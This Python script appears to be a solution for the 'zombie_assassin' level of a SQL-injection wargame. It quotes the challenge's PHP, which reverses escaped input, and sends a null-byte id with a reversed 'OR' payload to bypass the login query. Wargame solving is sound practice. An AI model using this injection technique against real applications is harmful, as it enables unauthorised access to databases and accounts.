#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Zombie_assassin

    $_GET['id'] = strrev(addslashes($_GET['id']));
    $_GET['pw'] = strrev(addslashes($_GET['pw']));
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) solve("zombie_assassin"); 
    '''

    url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = dict(id=chr(0), pw='#1||')

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Zombie_assassin Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
